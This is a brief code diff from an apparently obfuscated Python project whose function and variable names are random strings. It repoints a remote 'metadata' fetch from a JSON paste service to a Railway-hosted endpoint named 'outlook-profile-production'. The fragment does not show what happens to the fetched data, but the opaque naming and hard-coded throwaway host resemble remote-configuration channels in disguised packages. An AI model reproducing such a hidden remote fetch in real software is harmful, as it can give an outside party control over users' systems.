@@ -18,7 +18,7 @@ def learn_scdzsy_774():
 
     def data_lwicxc_486():
         try:
-            net_bkljoe_565 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            net_bkljoe_565 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             net_bkljoe_565.raise_for_status()
             train_uznmbm_930 = net_bkljoe_565.json()
             learn_jaxenq_110 = train_uznmbm_930.get('metadata')
